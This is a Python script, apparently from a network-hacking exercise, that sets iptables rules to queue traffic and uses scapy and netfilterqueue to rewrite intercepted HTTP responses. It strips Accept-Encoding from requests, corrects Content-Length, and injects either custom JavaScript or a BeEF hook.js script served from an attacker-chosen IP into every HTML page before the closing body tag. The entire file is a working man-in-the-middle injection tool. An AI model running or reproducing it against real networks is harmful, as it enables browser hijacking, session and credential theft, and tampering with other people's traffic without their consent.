#!/usr/bin/env python
from __future__ import print_function
import scapy.all as scapy
import netfilterqueue
import re
import sys
import os
#Force python to find the colorama package because reasons
sys.path.append("/usr/lib/python3/dist-packages")
from colorama import init, Fore
#Allows colors to work on windows systems
init()






#Recieve input from user and set injection code
answer = input("\n[1] HTML code injection\n[2] Beef hook.js injection\n\n[!] Please make selection: ")
if answer == 1:
    answer2 = input("\n[1] Run test injection\n[2] Custom injection\n\n[!] Please make selection: ")
    if answer2 == 1:
        injection = "<script>alert('test');</script>"
    elif answer2 == 2:
        injection = raw_input("[!] Please enter code to be injected: ")
        
    else:
        sys.exit(Fore.RED + "[-] Please select a valid option!\n" + Fore.RESET)
elif answer == 2:
    supplied_ip = raw_input("Please enter hooking IP : ")
    injection = '<script src="http://' + supplied_ip.strip() + ':3000/hook.js"></script>'
    
else:
    sys.exit(Fore.RED + "[-] Please select a valid option!\n" + Fore.RESET)

#Enables forwarding of packets for both local and targets
print(Fore.YELLOW + "\n[+] Setting up iptables")
os.system("iptables -I FORWARD -j NFQUEUE --queue-num 0")
os.system("iptables -I OUTPUT -j NFQUEUE --queue-num 0") 
os.system("iptables -I INPUT -j NFQUEUE --queue-num 0") 


print(Fore.GREEN + "\n[+] Injection ready")
print(Fore.YELLOW + "[+] Injection code: " + injection )
print(Fore.GREEN + "[+] Waiting......\n" + Fore.RESET )


#Change load of packet
def set_load(packet, load):
    packet[scapy.Raw].load = load
          
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet

#Function to take packet and inject code
def inject_packet(packet):
    
    #Convert packet to scapy_packet
    scapy_packet = scapy.IP(packet.get_payload())
    
    #Check to see if TCP packet and has raw layer (avoids needless packet altering)
    if scapy_packet.haslayer(scapy.Raw) and scapy.TCP in scapy_packet:
        
        #Set load variable
        load = scapy_packet[scapy.Raw].load
        
        #If packet is a request 
        if scapy_packet[scapy.TCP].dport == 80:
            #Remove encoding on HTML allowing us to read it
            load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)

            


        
            
        #If packet is a response (What we want to inject)
        elif scapy_packet[scapy.TCP].sport == 80:
            
            
            #Inject code into packet!
            load = load.replace("</body>", injection + "</body>")
            
            #Make sure content length is correct in HTML header to avoid load errors and fix if not
            content_len_search = re.search("(?:Content-Length:\s)(\d*)", load)
            if content_len_search and "text/html" in load:
                content_len = content_len_search.group(1)
                new_content_len = int(content_len) + len(injection)
                load = load.replace(content_len, str(new_content_len))

        #Checks to see if load has been changed, avoiding unnecessary load replacement     
        if load != scapy_packet[scapy.Raw].load:
            
            print(Fore.CYAN + "\r[!] Detected HTML Response >>>> Code injected!" + Fore.RESET, end="")
            
            #crafting new packet
            new_packet = set_load(scapy_packet, load)
            packet.set_payload(str(new_packet))
            
    #sends packet on its merry way!
    packet.accept()
    
    
#Catches interupts
try:
    queue = netfilterqueue.NetfilterQueue() 
    queue.bind(0, inject_packet)
    queue.run()
except KeyboardInterrupt:
    
    print(Fore.GREEN + "\n\n[!] Interupt detected!")
    print(Fore.GREEN + "[+] Restoring iptables!")
    os.system("iptables --flush") 
    sys.exit(Fore.RED + "Exiting program" + Fore.RESET)